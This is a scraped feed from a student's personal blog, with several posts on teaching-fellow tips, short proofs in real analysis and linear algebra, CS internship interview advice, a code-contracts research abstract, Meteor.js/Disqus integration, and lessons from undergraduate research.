    <content type="html"><![CDATA[<p>The purpose of this post is to provide concrete pointers to becoming a better undergraduate teaching
fellow (Harvard lingo for student instructor, course assistant, etc.). </p>

<p>Being an undergraduate instructor can be tricky. First, the students are the same age as you. Second, it can be hard to know how to improve. In my experience as both a student writing feedback and an instructor receiving feedback, students usually won’t write more than two sentences of feedback. </p>

<p>The word “teaching” usually evokes an image of an instructor at a whiteboard. While effective
communication skills are important, the environment and perceptions that an instructor
fosters among students is equally important. For that reason, I’m choosing to focus on aspects outside of
teaching classroom material. </p>

<h2 id="disclaimer">Disclaimer</h2>

<p>I’m still an undergraduate with a fraction of the teaching experience of a
professor – but the advantage of youth is that I can still remember the most basic and glaring
mistakes that student instructors make. </p>

<p>These tips are derived from three sources:</p>

<ol>
  <li>My own mistakes as a teaching fellow</li>
  <li>My own experience as a student</li>
  <li>My observations of other student instructors</li>
</ol>

<h2 id="avoid-saying-that-things-are-easy">1. Avoid saying that things are easy.</h2>
<p><strong>Concrete action</strong>: Try to catch yourself before using any of these phrases or their variants:
“this problem is easy”, “this problem is really simple”, “this is not too hard”, etc.</p>

<p>Here’s a real story (identifying details omitted). A student in a course (that I was teaching) told
me that another instructor thought that the course was easy when the
instructor, who had a strong mathematics background, had taken it. The student, who was struggling
in the course, was clearly bothered by this.</p>

<p>Ultimately, telling a student that the course was “supposed to be” easy
achieved nothing positive. It only served to foster the student’s apprehension about the course.</p>

<p>Many people would find it obvious that an instructor shouldn’t tell a struggling student that a task
is easy. However, note that it’s also a bad <em>preface</em> to an example problem – before anybody
mentions confusion. Deeming the problem “easy” beforehand will make potentially confused
students feel worse.</p>

<h2 id="explicitly-emphasize-your-accessibility">2. Explicitly emphasize your accessibility.</h2>
<p><strong>Concrete action</strong>: At the beginning of every section (or every section for the first half of the
semester), tell the students to email you any questions that they have about the course or problem
sets – no matter how trivial.</p>

<p><strong>Phrasing is important.</strong> As an instructor, I particularly emphasized my willingness to look at the
rigor of proofs,
a common concern in introductory mathematics courses – telling students that I would avoid saying
whether their answer was correct but would instead give feedback on the rigor of their proofs.</p>

<p>Consider the result of being passively open to questions. In the back of their heads, students
know that they <em>can</em> approach you for questions, but they may be worried about looking “dumb” or
coming off as annoying. Explicitly emphasizing your accessibility fosters an environment that allows
you to help struggling students.</p>

<h2 id="admit-when-you-dont-know-the-answer----then-find-it">3. Admit when you don’t know the answer – then find it.</h2>
<p><strong>Concrete action</strong>: If a student puts you on the spot with a question, and you can’t figure out the
answer, admit it, but <em>make sure</em> to follow up with the student later.</p>

<p>An appropriate response – one I’ve used many times – is along the lines of: “I’m sorry, I don’t
know off the top of my head. I’ll find out and send you an email.” (Of course, you should always first <em>try</em> to answer the question) </p>

<p>Most of the time, the student doesn’t urgently need the answer. As much as it might ring the ego,
it’s better to send the student a well thought-out answer than stalling (wasting everyone’s time) or
giving a copout answer (hurting the student’s learning). </p>

<h2 id="dont-rely-on-the-solutions-key">4. Don’t rely on the solutions key.</h2>
<p><strong>Concrete action</strong>: Fully solve any solution that you’re responsible for explaining
(example problem in section, homework problem, etc.). </p>

<p>In my experience, failing to do this will, with nontrivial probability, result in trying to parse
the solutions under high pressure. <strong>Having the solutions key is not the same as having the
ability to explain the steps of a solution</strong> (I know of a few other instructors that were capable of
procuring explanations quickly – I am not one of them). Working through the solutions beforehand
ensures that you can maximize your helpfulness to students.</p>

<h2 id="follow-the-course-materials-with-the-students">5. Follow the course materials with the students.</h2>
<p><strong>Concrete action</strong>: Read any potential source of questions – textbook
chapters, slides, notes – in step with the timeline of the course.</p>

<p>Familiarize yourself with the students’ readings. Even if you know the course concepts, students often have fairly specific
questions about certain examples in the readings. The ideal response is to explain
an example after rereading it once, having already reviewed the students’
readings. </p>

<p>The wrong response to a question – which, I guiltily admit, has happened to me on occasion –
is to ask the student to wait, spending substantially longer to read, parse, and understand the
example in question. </p>

<h2 id="conclusion">Conclusion</h2>
<p>A good way to improve as an instructor is to consider the qualities that you appreciate in
instructors (or more saliently, the qualities that you dislike).</p>

<p>If you haven’t considered teaching as an undergraduate, I strongly encourage you to think about it. Teaching as an
undergrad is a unique (and sometimes
<a href="http://harvardpolitics.com/harvard/harvard-undergraduates-teaching-harvard-doesnt-want-talk/">controversial</a>)
opportunity.</p>

<p><em>Thank you to Ruth Fong for contributing to this article.</em></p>

<p><em>Thank you to Paul Bamberg, Stephen Chong, Harry Lewis, Emily Riehl, and Salil Vadhan for providing me valuable
opportunities to teach during my college years. I am especially indebted to Paul for propelling me into
teaching as an undergraduate.</em></p>

    <link href="http://louisrli.github.io/blog/2014/11/07/bolzano-weierstrass-without-sequences/"/>
    <updated>2014-11-07T00:00:00-05:00</updated>
    <id>http://louisrli.github.io/blog/2014/11/07/bolzano-weierstrass-without-sequences</id>
    <content type="html"><![CDATA[<p>The <a href="http://en.wikipedia.org/wiki/Bolzano%E2%80%93Weierstrass_theorem">Bolzano-Weierstrass theorem</a>
is a common theorem taught in introductory real analysis and topology courses. </p>

<p>All of the proofs that I’ve read for the Bolzano-Weierstrass theorem involve constructing sequences.
In my introductory topology course, I wanted to see if I could write a simple proof of the theorem
<em>without</em> having to explicitly construct any sequences.</p>

<p>(It’s worth noting that the proof for compact <script type="math/tex">\implies</script> sequentially compact requires constructing
sequences. If we take this as given, then we get to avoid sequences.)</p>

<h2 id="theorem-bolzano-weierstrass">Theorem (Bolzano-Weierstrass)</h2>
<blockquote>
  <p>Any bounded sequence in <script type="math/tex">\mathbb{R}^n</script> has a convergent subsequence.</p>
</blockquote>

<!-- more -->

<h2 id="proof">Proof</h2>

<p>We will make use of the following propositions, which I will assume to be previously proved. The
proofs of these are in a standard topology textbook (I’m reading from Munkres, 2nd edition). </p>

<p>I’ll redefine various notions of compactness below, since there exists some ambiguity in the
different forms of compactness.</p>

<blockquote>
  <p><strong>Definition.</strong> A topological space is <strong>sequentially compact</strong> if every
infinite sequence has a convergent subsequence.</p>
</blockquote>

<blockquote>
  <p><strong>Proposition 1.</strong> The interval <script type="math/tex"> [a, b] \subset \mathbb{R} </script> is compact.</p>
</blockquote>

<blockquote>
  <p><strong>Proposition 2.</strong> The product of compact spaces is compact.</p>
</blockquote>

<p>In fact, this proposition true in both the infinite case (<a href="http://en.wikipedia.org/wiki/Tychonoff's_theorem">Tychonoff’s
theorem</a>) and the finite case.</p>

<blockquote>
  <p><strong>Proposition 3.</strong> (Munkres, Theorem 28.2) <script type="math/tex"> X </script> is compact <script type="math/tex"> \implies </script> <script type="math/tex"> X </script> is
sequentially compact.</p>
</blockquote>

<p>We now prove Bolzano-Weierstrass.</p>

<p>Let <script type="math/tex"> \{ x_i \} </script> be a bounded sequence in <script type="math/tex"> \mathbb{R}^n </script>. We need to show that <script type="math/tex"> \{ x_i \}
</script> has a convergent subsequence.</p>

<p>Since the sequence is bounded in <script type="math/tex"> \mathbb{R}^n </script>, by definition of bounded, every element of
the sequence is contained in some closed interval of <script type="math/tex"> \mathbb{R}^n </script>:</p>

<script type="math/tex; mode=display"> A = [m, M]^n </script>

<p>where <script type="math/tex"> m, M </script> denote the “minimum” and “maximum” of our bounded interval. </p>

<p>Note that <script type="math/tex">[m, M] </script> is compact (Proposition 1). </p>

<p>It follows that <script type="math/tex"> A </script> is compact – it is the product of compact spaces (Proposition 2). </p>

<p>Because <script type="math/tex"> A </script> is compact, <script type="math/tex"> A </script> is sequentially compact (Proposition 3). </p>

<p>In a sequentially compact space, any sequence of points has a convergent subsequence. Note that <script type="math/tex">
\{ x_i \} </script> is one such sequence contained in the sequentially compact space <script type="math/tex"> A </script>, and it
follows that <script type="math/tex"> \{ x_i \} </script> must have a convergent subsequence.</p>

    <id>http://louisrli.github.io/blog/2014/11/06/negative-determinant-odd-even-matrix</id>
    <content type="html"><![CDATA[<p>The proof for this is straightforward, but I didn’t find it explicitly stated elsewhere on the web
– it may just be one of those propositions that’s hard to phrase as a search query. In words:
the negative determinant of an odd square matrix is the determinant of the negative matrix.</p>

<h2 id="proposition">Proposition</h2>
<blockquote>
  <p>If <script type="math/tex">A</script> is an <script type="math/tex"> n \times n </script> square matrix and <script type="math/tex"> n </script> is odd, then <script type="math/tex"> \det(-A) =
-\det(A) </script>.</p>
</blockquote>

<!-- more -->

<h2 id="proof">Proof</h2>

<p>Negating all elements of a row of the matrix <script type="math/tex">A</script> negates the determinant of the matrix
(<a href="https://proofwiki.org/wiki/Effect_of_Sequence_of_Elementary_Row_Operations_on_Determinant">proof</a>
– think about it as multiplying a row by the scalar <script type="math/tex">-1</script>). </p>

<p><script type="math/tex">-A</script> is equivalent to <script type="math/tex"> A </script> with each of its rows negated. Because <script type="math/tex"> n </script> is
odd:</p>

<script type="math/tex; mode=display"> \det(-A) = (-1)^n \det(A) = -\det(A) </script>

<h2 id="context">Context</h2>
<p>This fact was needed to prove that if <script type="math/tex"> A </script> is a <a href="http://en.wikipedia.org/wiki/Orthogonal_group">special orthogonal
matrix</a> and <script type="math/tex"> n </script>
is odd, then <script type="math/tex"> A </script> has at least one eigenvector with eigenvalue <script type="math/tex"> 1 </script>.</p>

<p>Note that if <script type="math/tex">n</script> is even, we can prove that <script type="math/tex">\det(A) = \det(-A)</script> using the same technique.</p>

    <link href="http://louisrli.github.io/blog/2014/01/18/tips-for-computer-science-internship-interviews/"/>
    <updated>2014-01-18T00:00:00-05:00</updated>
    <id>http://louisrli.github.io/blog/2014/01/18/tips-for-computer-science-internship-interviews</id>
    <content type="html"><![CDATA[<p>This post is meant to help computer science undergraduates looking for a software engineering internship in the summer. Applying to internships can be daunting, and this post will hopefully address some of the commonly asked questions that I see on Reddit’s <a href="http://www.reddit.com/r/cscareerquestions">cscareerquestions</a>.
Along with some other miscellanea regarding applications, this post covers two things: </p>

<ol>
  <li>What are most internship interviews like?</li>
  <li>How should I prepare for them?</li>
</ol>

<h2 id="background">Background</h2>
<p>I did <a href="http://louisrli.github.io/blog/2013/06/28/researchtips/">research</a> last summer, and this summer was my first time seriously looking for an internship. From the beginning of September 2013 to the beginning of January 2014 (around 16 weeks), I did a lot of interviewing: 20 technical interviews, four recruiter interviews, two coding challenges, one product manager interview, and one trader interview (involuntarily moved from software engineering). 
One of the reasons that I did so many interviews was that I did poorly on many of my interviews for the first month. 
Despite having read about interviewing on the internet, I wish I had known more <em>concretely</em> how to prepare.</p>

<!-- more -->

<p>Finally, note that I mostly interviewed with medium to large companies in Silicon Valley: your mileage may vary with local companies or smaller startups.
Out of respect for the companies that I interviewed with, I won’t be linking specific companies to specific interview questions.</p>

<h1 id="the-three-types-of-internship-interviews">The three types of internship interviews</h1>

<p>I would categorize my internship interviews as falling into one of three categories:</p>

<ol>
  <li><strong>The programming interview:</strong> algorithms, data structures, coding</li>
  <li><strong>The “what you’ve done interview”:</strong> you and your projects</li>
  <li><strong>The language-specific interview:</strong> quizzed about a language you claim to know</li>
</ol>

<p>I’ll explain these in more depth below, adding details on how to prepare for each category. Note
that not every interview falls precisely into one of the three categories, and some interviews
are a mix of multiple categories.</p>

<ol>
  <li>
    <h2 id="the-programming-interview">The programming interview</h2>
  </li>
</ol>

<p>The <strong>programming interview</strong> is the most common type of interview, especially if you’re not interviewing for a specific team.
This is how most people envision computer science interviews: you’re asked one or more programming questions, 
and you implement solutions on a collaborative editor like <a href="http://stypi.com">Stypi</a> or <a href="http://collabedit.com">Collabedit</a>. </p>

<p>I would further divide these interviews into two topics:</p>

<ol>
  <li>Questions involving loops, lists, or strings (easier)</li>
  <li>Questions involving specific data structures (harder)</li>
</ol>

<p>I think the first category is easier, and it includes questions like: <em>Remove duplicates from a list</em> or <em>Generate all of the permutations of a string</em>. Even if you don’t immediately know the answer, there’s a chance that you can figure it out without requiring knowledge of a specific algorithm or data structure.</p>

<p>I find the second category trickier, and sometimes the question will be hard 
or near impossible if you don’t know about a specific data structure or algorithm.
For example, if you’ve never done breadth-first tree traversal, 
and you’re asked: <em>Print the values in this tree level-by-level</em> 
(a question that I received from two different companies),
the question will be much harder.<br />
In one interview, I did poorly when we delved 
deeply into variations of hash tables, but I was only familiar 
with basic linked list hash tables.</p>

<p>At the end of every question, you will almost always be asked to 
discuss the Big-O complexity of your implementation. </p>

<h3 id="checklist">Checklist</h3>

<p>Here’s what I didn’t realize at first: instead of just walking
in, <strong>you should study for interviews</strong>.
Unless you do algorithmic challenges on a regular basis, it’s worth the time
to read and practice.</p>

<ul>
  <li><strong>Read <em><a href="http://www.amazon.com/Programming-Interviews-Exposed-Secrets-Programmer/dp/047012167X">Programming Interviews Exposed</a></em>:</strong> 
Focus on these topics: string manipulation, linked lists, doubly linked lists, hash tables, 
trees, queues, stacks, depth-first search, breadth-first-search, basic graphs,
basic complexity.</li>
  <li><strong>Check Glassdoor</strong>: Many companies have interview questions on Glassdoor. Your goal isn’t
to study the interview questions in advance, but you can get a good idea of the general difficulty
of the programming questions.</li>
  <li><strong>Practice at least once</strong>: I’ll let the interview books cover
this process in more detail, but if this is your first interview, 
I highly recommend practicing an interview question from start to finish with a friend.</li>
</ul>

<p>I would take books like <em>Programming Interviews Exposed</em> with a grain of salt. Except for some of the very big companies, like Facebook,
the interview questions for internships are generally much easier than those for senior developers. You won’t be asked to write
a red-black tree from scratch. From my experience, the list above comprehensively covers the topics from my interview experience
(suggestions welcome).</p>

<p>Depth- and breadth-first search (DFS and BFS, respectively) were extremely popular, and I would estimate <strong>over half of my algorithms interviews 
were best solved with DFS or BFS</strong>. Know them!</p>

<ol>
  <li>
    <h2 id="the-what-youve-done-interview">The “what you’ve done” interview</h2>
  </li>
</ol>

<p>The <strong>“what you’ve done” interview</strong> is a non-technical, pleasant conversation with your interviewer,
where you get the opportunity to talk about your resume and projects. I found that this
type of interview was more common in small and medium sized companies.</p>

<p>Empirically, I did better on these interviews than on algorithmic interviews, because
it was an opportunity to pitch myself as a passionate developer.
I usually talked about my research, my past internship, 
and/or my experience at <a href="https://www.meteor.com/blog/2013/07/09/congratulations-to-the-meteor-summer-hackathon-2013-teams">the Meteor Summer Hackathon</a>.</p>

<p>Note that I’m a junior (third year undergraduate student). 
If you’re a freshman or sophomore, don’t panic if you don’t have a lot to
talk about yet. Without sideprojects and/or past internships, however,
this interview can be tough. 
You can use course projects, but I think people know that most course projects
are a few files that are hacked together in a few days (varies by school, of course).</p>

<h3 id="checklist-1">Checklist</h3>

<p>Be prepared to talk in-depth about any jobs and projects on your resume. 
For each project, you’ll want to be ready to answer these questions:</p>

<blockquote>
  <p>What was the project?</p>
</blockquote>

<p><a></a> <!-- break the blockquote --></p>

<blockquote>
  <p>What was the scope of the project? (i.e., how much time, how big was it)</p>
</blockquote>

<p><a></a> <!-- break the blockquote --></p>

<blockquote>
  <p>What was your role in the project?</p>
</blockquote>

<p><a></a> <!-- break the blockquote --></p>

<blockquote>
  <p>What did you learn?</p>
</blockquote>

<p><a></a> <!-- break the blockquote --></p>

<blockquote>
  <p>What were some of the challenges in the project?</p>
</blockquote>

<p>If you prepare these answers, you’ll be ready to answer a more general question that frequently shows up in interviews:</p>

<blockquote>
  <p>Tell me about a technical challenge that you had.</p>
</blockquote>

<ol>
  <li>
    <h2 id="the-language-specific-interview">The language-specific interview</h2>
  </li>
</ol>

<p>The language-specific interview tests your knowledge about a specific language that you
claim to know on your resume. This interview often shows up if you’ve been placed to interview 
with a specific team (e.g., iOS Safari team at Apple, YUI team at Yahoo).</p>

<p>I was never asked coding questions in these interviews, but the interviewers
expected me to show my knowledge through my answers to quiz questions,
my discussion of relevant projects, and my opinions on language features.</p>

<h3 id="checklist-2">Checklist</h3>

<p>If you are placed to interview with a team that uses a specific
language (or framework), you should prepare for the following questions.
I was asked each of these on multiple occasions:</p>

<blockquote>
  <p>What makes {language} different from other languages?</p>
</blockquote>

<p><a></a> <!-- break the blockquote --></p>

<blockquote>
  <p>If you had to change something in {language}, what would you change?</p>
</blockquote>

<p><a></a> <!-- break the blockquote --></p>

<blockquote>
  <p>Tell me about a technical challenge that you had when you were working on a project in {language}.</p>
</blockquote>

<h3 id="javascript-specific-questions">JavaScript specific questions</h3>

<p>In addition to the above questions, I was also asked the following question 
on three different occasions for JavaScript-related internships:</p>

<blockquote>
  <p>Tell me about closures in JavaScript.</p>
</blockquote>

<p>I usually answered with an explanation of 1. callbacks 2. function scope in JavaScript. 
Closures allow for more traditional object-oriented programming (e.g., objects in Backbone.js are just closures).</p>

<p>One question that I was <em>not</em> asked in any interview was to recite the value of <code>this</code> in various contexts
(not that this means it isn’t fair game).</p>

<h2 id="odds-and-ends">Odds and ends</h2>

<p>Again, not every interview will fall into one of these three categories. I encountered a couple of weird interview styles:</p>

<ul>
  <li><em>Straight quizzing:</em> One first round interview a recruiter who read quiz questions about databases, Unix systems, and web requests.
The recruiter had a list of answers, and I suspect one important metric, in addition to correctness, was how confidently you answered.</li>
  <li><em>Coursework:</em> I interviewed with a very cool stealth startup working on something that has it roots in security research. Correspondingly,
the whole interview was about my coursework in compilers and theory of computation – no technical questions.</li>
</ul>

<h1 id="beginning-the-interview">Beginning the interview</h1>

<p>Some bigger companies dive straight into the technical part of interviews, but your interviewer will <strong>almost always</strong> ask you a very important question (or some variant) that you should prepare:</p>

<blockquote>
  <p>Tell me about yourself.</p>
</blockquote>

<p>Keep it succinct! I would say it should be a minute long at most. Hit the important points about your interests and experience, and spare your interviewer the life story. I’m saying this because I made the mistake of having a long pitch in the first few interviews, and I could tell that the interviewer ended up getting bored.</p>

<h1 id="ending-the-interview">Ending the interview</h1>

<p>Even when the interview runs over the allocated time, your interviewer will ask:</p>

<blockquote>
  <p>Do you have any questions for me?</p>
</blockquote>

<p>I used to have a lot of trouble with this, but after I started treating it as
an opportunity for conversation, it became much easier. This is a chance to connect on a personal level with the interviewer.
If your performance was borderline, having an insightful conversation
with the interviewer can’t hurt.</p>

<p>If the interviewer hadn’t described himself or herself yet, the first thing I asked was:</p>

<blockquote>
  <p>Can you tell me more about what you do?</p>
</blockquote>

<p>I let the conversation flow from there. If there’s not much to follow up on, I’ll
ask about how they test their product or choose to target new features. There’s <a href="http://programmers.stackexchange.com/questions/16436/do-you-have-any-questions-for-us-in-an-interview">a very good list</a> on Programmers Stack Exchange, although not all of them are suitable for potential interns to ask.</p>

<h1 id="miscellaneous-faq">Miscellaneous: FAQ</h1>

<p>These are my answers to questions that either I was asking at the beginning of the application process or I see 
frequently asked. Most of these don’t have black-or-white answers.</p>

<blockquote>
  <p>How long should my resume be?</p>
</blockquote>

<p>For companies based in the US, your resume should not be longer than one page. Personally,
I don’t like reading resumes longer than one page. From what I’ve read from various
recruiters and managers on the internet, they don’t either, although it doesn’t mean
automatic rejection.</p>

<p>Make sure your resume looks professional – spacing, font, structure. Use a serif font!</p>

<p>If your resume is too long, consider cutting out parts that are not tech related – clubs, extracurriculars, experience in a different field.</p>

<p>Finally, don’t include things like your high school GPA, because they don’t matter to the people reading your resume.</p>

<blockquote>
  <p>When should I start applying?</p>
</blockquote>

<p>Most internship applications started popping up in October and November.
I think it doesn’t hurt to apply earlier, although one friend told me that
intern candidates at his company usually fared better in spring than in fall.</p>

<p>Before last summer, after I had already decided to do research, I did receive
a few emails for interviews as late as March. If you didn’t jump on it in October,
don’t panic.</p>

<blockquote>
  <p>How important are sideprojects? </p>
</blockquote>

<p>It depends on the company, but if you’re a freshman (first year) or 
a sophomore (second year), it’s important. 
When I applied to my first internship in freshman spring, 
the recruiter emailed me back saying that the manager 
wanted to know if I had any sideprojects. In addition
to spicing up your resume, it gives you
something substantive to talk about in the “what you’ve done” interviews.</p>

<blockquote>
  <p>How long can it take to hear back after an interview?</p>
</blockquote>

<p>It varies by company. 
From small to medium sized companies, I heard back anywhere from a day to a week.
Without exception, after a final round interview, it took every big company two weeks to a month 
to respond with either an offer or rejection.</p>

<blockquote>
  <p>How can I overcome nervousness during interviews?</p>
</blockquote>

<p>In some of the algorithmic interviews, when I started doing poorly, I would just freeze and ramble – especially if I hadn’t slept much the previous night because of schoolwork.
Eventually, the interviewer would (pretty much) tell me the answer, which almost always led to rejection after the interview. </p>

<p>If this happens to you, my advice is to tell the interviewer, “Let me consolidate my thoughts for a moment.” Take a few deep breaths, don’t think about anything, and then tackle the question again.</p>

<p>If you feel nervous from the very beginning, try to persuade yourself that it’s only a friendly conversation. </p>

<blockquote>
  <p>How can I know how well my interview went?</p>
</blockquote>

<p>In my experience, if the interviewer starts talking about how much responsibility interns 
have <em>and</em> you didn’t explicitly ask about it – the interview probably went well.  This is not a guarantee by any means.</p>

<p>I’ve read a few things on the internet about asking your interviewer how they felt the interview went. 
I haven’t tried this before, but feel free to let me know if you have. 
I think it would be a useful source of feedback.</p>

<p>Hope this helps.</p>

    <id>http://louisrli.github.io/blog/2014/01/09/erasable-contracts</id>
    <content type="html"><![CDATA[<p>This semester, I took a course on the science of cybersecurity, targeted toward an audience with some programming languages background. </p>

<p>A classmate and I had a semester long research project on “erasable” <a href="http://en.wikipedia.org/wiki/Code_contract">code contracts</a>. More details are below.</p>

<p>This was a valuable experience, giving me an opportunity to work on two things that I hadn’t done before:</p>

<ol>
  <li>Proof-based research</li>
  <li>Basic proofs of a calculus. While type soundness proofs and their associated lemmas are core to many calculi, many introductory programming language courses, including the one that I took, skip the details of the proofs.</li>
</ol>

<!-- more -->

<p>Here’s the abstract:</p>

<blockquote>
  <p>Contract programming is a design approach that allows programmers to design formal specifications for software, known as “contracts”. These contracts, executed at runtime, allow programmers to make assertions about the behavior of their software and ensure program correctness. In a language with side-effects, however, it is possible for these contracts to modify memory and consequently change the behavior of the program. While contracts provide the specifications, these specifications clearly should not change the behavior of the program that they enforce. Instead, if the contracts were removed (“erased”), then the behavior of the program should be the same as if the contracts remained. This notion is captured by the idea of erasability. We present a calculus for erasable contracts, establish properties such as type soundness, and prove a formal definition of erasability for the language.</p>

If you’re reading this during the school year, there probably won’t be anything, since student dining isn’t open.</p>

<p>This version was written in <a href="http://marionettejs.com">Marionette.js</a>, which has been my client-side framework of choice for the past few months (I’ve been using Meteor for things that require a more involved database).

    <link href="http://louisrli.github.io/blog/2013/07/29/using-meteor-js-with-disqus/"/>
    <updated>2013-07-29T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2013/07/29/using-meteor-js-with-disqus</id>
    <content type="html"><![CDATA[<p>On most sites, using Disqus as the commenting system is as simple as copying the <a href="http://disqus.com/admin/universalcode/">Universal Code</a> (also known as <code>embed.js</code>) into a web page. In single-page JavaScript applications, however, much of the rendering is on the client-side. This means that <code>embed.js</code> might lead to stale Disqus threads or function incorrectly as pages are re-rendered.</p>

<p>This article explains how to integrate Disqus with <a href="http://meteor.com">Meteor.js</a> (version 0.6.4.1 at the time of writing). If you want one Disqus thread for each route, copying the Universal Code won’t ensure that Disqus loads the correct thread for each page. Instead, the comments will either fail to load or retrieve a stale thread.</p>

<p>When <code>embed.js</code> is loaded multiple times (when pages rerender and run the script multiple times), the following error will appear in the console: </p>

<pre><code>DISQUS assertion failed: Unsafe attempt to redefine existing module &lt;name&gt;
</code></pre>

<p><em>Note</em>: I’m using <a href="https://github.com/tmeasday/meteor-router">Meteor Router</a> to create URL paths in my application, although this method should work with any routing system.</p>

<h2 id="disqus-single-sign-on">Disqus Single Sign-on</h2>
<p>As a bonus, I’ve added the optional code snippet in <code>Deps.autorun()</code> for using <a href="http://help.disqus.com/customer/portal/articles/236206-integrating-single-sign-on">Disqus Single Sign-on</a> with Meteor. If you want to see the server-side code in JavaScript, take a look at <a href="https://github.com/disqus/DISQUS-API-Recipes/blob/master/sso/javascript/main.js">the examples that I added</a> to the Disqus API Recipes.</p>

<h2 id="annotated-code">Annotated Code</h2>

<p>The code is written in <a href="http://coffeescript.org/">CoffeeScript</a>. If you want to take a look at the JavaScript version, you can use the <a href="http://coffeescript.org/#try:">CoffeeScript translator</a>. Meteor automatically compiles <code>.coffee</code> files to <code>.js</code>.</p>

<p>With the code below, all you have to do is add the following to your Meteor Handlebars template to include Disqus comments:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line"> {{&gt; disqus}} </span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="disqus-in-other-single-page-javascript-frameworks">Disqus in Other Single-page JavaScript Frameworks</h2>

<p>If you’re using another single-page JavaScript framework like Ember.js, Angular.js, etc., here’s a general strategy for using Disqus:</p>

<ol>
  <li>Wait until the first time a Disqus thread needs to be loaded.<br />
When <code>div #disqus_thread</code> has been rendered, load <code>embed.js</code> into the page.</li>
  <li>Set a global flag to ensure that <code>embed.js</code> is not loaded again.</li>
  <li>Each time a new Disqus thread is needed, trigger a <code>DISQUS.reset()</code>, including
the first time <code>embed.js</code> is loaded. Again,
make sure that <code>div #disqus_thread</code> is rendered in the DOM, or there may be an error
about appending an element to <code>null</code>.</li>
</ol>

    <link href="http://louisrli.github.io/blog/2013/06/28/researchtips/"/>
    <updated>2013-06-28T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2013/06/28/researchtips</id>
    <content type="html"><![CDATA[<p>Today, I submitted my first extended abstract to the ASSETS 2013 Student Research Competition. This marks my first tangible output in undergraduate research. This isn’t quite the end of the story – I plan to continue gathering results and writing a paper for submission to CHI. It is, however, time for reflection.</p>

<!-- more -->

<p>My research endeavors (in human-computer interaction) have been an incredible learning experience. In this post, I want to talk about some of the more <em>practical</em>, elementary lessons that I learned about the research process. These are mostly time-saving lessons. Unfortunately, I missed a lot of these lessons when I did medical research in high school. My sincerest hope is that another undergraduate researcher, working on his or her first research project, will stumble upon this post and save some valuable time.</p>

<p><strong>I have no doubt that grad students and experienced researchers know these already – these are for first-time lead researchers.</strong> Or, if you’re a grad student or Ph.D that disagrees with anything below, feel free to impart your wisdom by correcting or qualifying it (I place a lot of weight on the wisdom of the ancients – not that you’re ancient…).</p>

<h3 id="design-and-analysis-find-answers-in-the-results-and-methods-sections">1. Design and analysis: Find answers in the results and methods sections</h3>

<p>Research papers aren’t only valuable for their graphs and conclusions. Chances are, there are similarly designed experiments floating around on Google Scholar (what papers are in your literature review?).</p>

<p>Although I initially relied on asking others, I found that consulting past work is an excellent way of finding answers to questions yourself. These include answers to questions like:</p>

<ul>
  <li>What statistical analyses do others usually employ on experiments of similar design?</li>
  <li>How do others exclude outliers?</li>
  <li>How did others run experiments that had similar conditions?</li>
  <li>What metric is usually used to present errors in clicking tasks?</li>
</ul>

<p>And many more. I still discussed my various approaches with other people before moving forward to make sure that I wasn’t misinterpreting the papers, but if you’re ever feeling <em>clueless</em> about anything, check the literature first.</p>

<h3 id="data-collection-if-your-data-is-simple-just-store-it-as-csv">2. Data Collection: If your data is simple, just store it as CSV</h3>

<p>Really, just store it as CSV. <strong>Every data analysis application accepts CSV</strong>, and it saves time from parsing to store the raw results as CSV.</p>

<p>I went through a few iterations of data storage. First, I stored things in a MySQL database. Having interned at a database company last summer, the thought of appending my data to a plaintext file was horrifying.</p>

<p>I soon realized, however, that the overhead of storing, retrieving, and quickly inspecting values in a database was more trouble than it was worth. I opted to store my results (time, error, trajectory, detailed mouse logs, questionnaires – each with associated metadata) as JSON files, which made the logs easy to quickly inspect. Since I used MATLAB (more on that later) and JMP for analysis, I eventually parsed this JSON into numpy/MATLAB matrices, and finally, just CSV files. Oops!</p>

<p>Before you start gathering data, envision yourself processing the data. Keep in mind that you’ll most likely want to process your data as tables.</p>

<p>The caveat is that CSV isn’t too good at handling more complex data with parent-child relationships (though you could stringify lists into a cell).</p>

<h3 id="communication-make-it-easy-for-your-pi">3. Communication: Make it easy for your PI</h3>

<p>Professors have a reputation for being busy, though my PI (research advisor) is receptive to meeting if I need it. One thing that I quickly learned is that meetings go much more smoothly if I make it easy for him. More concretely: <strong>when possible, I should generate ideas and present them to him for feedback, rather than having him do the heavy lifting.</strong></p>

<p>After all, your PI is helping <em>you</em>, so he or she deserves your best effort to make the process less painful. These include things like being ready for meetings. At first, our meetings were pretty disorganized, but I learned that it’s a good idea to write up a very specific list of topics beforehand. This ensured that the meetings ran smoothly: demo, receive feedback, iterate through questions and discussion points, talk about next steps.</p>

<h3 id="data-analysis-dont-use-matlab-for-statistical-analysis">4. Data Analysis: Don’t use MATLAB for statistical analysis</h3>

<p>For some reason (the reason being that I was only familiar with MATLAB and Excel for analysis), I thought it was a good idea to use MATLAB for doing statistical analysis and making graphs. While MATLAB has a statistics toolbox and graphing functionality, it’s not great for playing around with data and generating graphs quickly.</p>

<p>The choice of program is personal preference – or in my case, inheritance. After spending an embarrassing amount of time grouping my data in MATLAB, I watched my PI replicate my work in five minutes using the Graph Builder in JMP. I ended up using JMP, and I really like it. The Graph Builder is wonderful. The documentation is okay (MATLAB has great documentation).</p>

<p>There are a lot of options – R, Stata, SPSS. I tried both SPSS and JMP. My initial impressions is that SPSS has a pretty bad user experience, while JMP’s workflow seems better thought out (though minor things could be improved).</p>

<p>An auxiliary lesson is that it’s worth asking a grad student, postdoc, or PI about their workflow before beginning an endeavor. Unfortunately, the ones in my group work in a different office and weren’t immediately accessible, but I’ll definitely ask if I find myself in a new situation.</p>

<h3 id="graphing-for-papers-excel-is-a-good-option">5. Graphing for papers: Excel is a good option</h3>

<p>There’s graphing for the purpose of playing with data, then there’s graphing for the purpose of producing a good looking PDF.</p>

<p>For the latter, I found that neither JMP nor MATLAB would let me style my graphs with the flexibility and speed that I wanted. One of the postdocs said that she used R or Excel. Excel was actually a very good option, since I just wanted to change the fonts, size, and bar labels. Lesson: with all the fancy tools, don’t forget about Excel.</p>

<p>I suspect Python might have some good graphing libraries, although the only one that I’ve used is <code>matplotlib</code>, which was basically MATLAB. It’s also possible to create graphs directly in TeX, although I would guess that it’s harder to iterate on the styling.</p>

